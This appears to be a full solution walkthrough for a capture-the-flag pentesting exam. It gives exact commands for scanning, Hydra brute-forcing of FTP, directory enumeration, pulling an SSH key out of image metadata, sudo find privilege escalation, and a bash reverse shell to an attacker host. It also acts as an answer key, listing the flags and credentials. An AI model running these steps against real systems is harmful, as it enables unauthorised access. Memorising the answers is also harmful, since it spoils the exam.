# Network Pentesting Exam - Complete Solution Walkthrough

This document contains the step-by-step offensive methodology and exact commands required to complete the exam.

---

## Stage 1: Port Scanning & Initial Reconnaissance

### Step 1.1: Full TCP Port Scan
```bash
nmap -p- --min-rate 1000 -sV -sC -oN initial_scan.txt <TARGET_IP>
```
**Discovered Ports:**
- `21/tcp`: vsftpd 3.0.x (`Apex Cyber Defense Secure FTP Gateway`)
- `80/tcp`: HTTP web server (Nginx)
- `2222/tcp`: OpenSSH (Notice: standard port 22 is closed!)

### Step 1.2: Web Application Reconnaissance (Port 80)
1. Browsing `http://<TARGET_IP>/` reveals the corporate portal **Apex Cyber Defense**.
2. Inspecting `http://<TARGET_IP>/about.html` reveals staff details:
   - Lead Systems Engineer: **Alice Smith**
   - Username: `alicesmith`
3. Inspecting the page source (`view-source:http://<TARGET_IP>/about.html`) reveals **Flag 1**:
   ```html
   <!-- STAGE 1 RECON FLAG: FLAG{w3b_r3c0n_us3rn4m3_f0und_9482} -->
   ```
4. Checking `http://<TARGET_IP>/login.html` states that web login is disabled and instructs staff to use the **FTP Gateway on Port 21**.

---

## Stage 2: CeWL Wordlist & FTP Clue

### Step 2.1: Scrape Password from Website with CeWL
```bash
cewl http://<TARGET_IP>/ -m 6 -w passwords.txt
```
Target password found in wordlist: `CyberVanguard`

### Step 2.2: Brute-Force FTP with Hydra
```bash
hydra -l alicesmith -P passwords.txt ftp://<TARGET_IP> -t 4
```
**Credentials Found:** `alicesmith` : `CyberVanguard`

### Step 2.3: Connect to FTP & Read Instructions
```bash
ftp <TARGET_IP>
# Name: alicesmith
# Password: CyberVanguard
```

List files in FTP:
```text
ftp> ls
-rw-r--r-- 1 alicesmith alicesmith  892 Nov 24 12:00 ssh_instructions.txt
```
*(Notice: Only ssh_instructions.txt is on FTP! No id_rsa is stored here).*

Download and read the instructions:
```text
ftp> get ssh_instructions.txt
ftp> bye
```

Inspect the instructions:
```bash
cat ssh_instructions.txt
```
```text
In compliance with corporate security directive #SEC-9912:
1. Standard SSH port 22 has been disabled. OpenSSH is running on
   custom port: 2222.
2. Plaintext SSH keys are strictly PROHIBITED on this FTP server.
   Your emergency key backup has been placed inside an unlinked hidden
   directory on our corporate web server (Port 80).
3. Use web directory enumeration tools (gobuster or dirsearch) against
   http://<TARGET_IP>/ to find the backup directory and retrieve security_backup.png.
4. Decode the base64 OpenSSH key embedded inside the image.
```

---

## Stage 3: Web Directory Enumeration (Gobuster/Dirsearch) & Image Decoding

### Step 3.1: Enumerate Web Directories with Gobuster or Dirsearch

#### Using Gobuster:
```bash
gobuster dir -u http://<TARGET_IP>/ -w /usr/share/wordlists/dirb/common.txt
```
**Output:**
```text
===============================================================
Gobuster v3.x
===============================================================
/about.html           (Status: 200)
/backup               (Status: 301) [--> /backup/]
/login.html           (Status: 200)
/style.css            (Status: 200)
===============================================================
```

#### Or Using Dirsearch:
```bash
dirsearch -u http://<TARGET_IP>/
```
**Output:**
```text
[12:00:00] 301 -  169B  - /backup  ->  /backup/
[12:00:00] 200 -  850B  - /backup/
```

### Step 3.2: Download the Hidden Recovery Image
Browse to `http://<TARGET_IP>/backup/` or download directly:
```bash
wget http://<TARGET_IP>/backup/security_backup.png
```

### Step 3.3: Decode the OpenSSH Key from Image Metadata

#### Method A: Using `exiftool` & `base64`
```bash
exiftool -Comment security_backup.png | base64 -d > id_rsa
```

#### Method B: Using `strings` & `base64`
```bash
strings security_backup.png | grep -E '^[A-Za-z0-9+/=]{100,}' | base64 -d > id_rsa
```

Verify your decoded key:
```bash
head -n 2 id_rsa
# Output: -----BEGIN OPENSSH PRIVATE KEY-----
```

---

## Stage 4: SSH Login on Port 2222 (Flag 2)

```bash
chmod 600 id_rsa
ssh -i id_rsa -p 2222 alicesmith@<TARGET_IP>
```

You are logged in as `alicesmith`!

Capture **Flag 2**:
```bash
cat user.txt
# Output: FLAG{ssh_k3y_auth_p0rt_2222_pwn3d_1834}
```

Check the clue:
```bash
cat clue.txt
```

---

## Stage 5: GTFOBins Root Privilege Escalation (Flag 3)

### Step 5.1: Check Sudo Permissions
```bash
sudo -l
# User alicesmith may run: (ALL) NOPASSWD: /usr/bin/find
```

### Step 5.2: GTFOBins Exploit / Reverse Shell

#### Option A: Direct Root Shell:
```bash
sudo /usr/bin/find . -exec /bin/bash \; -quit
```

#### Option B: Root Reverse Shell:
1. On your attacker machine:
   ```bash
   nc -lvnp 4444
   ```
2. In the SSH session:
   ```bash
   sudo /usr/bin/find . -exec /bin/bash -c "bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1" \; -quit
   ```

### Step 5.3: Capture Final Flag 3
```bash
cat /root/root.txt
# Output: FLAG{r00t_gtf0b1n5_pr1v3sc_succ3ss_8821}
```
Target completely compromised!
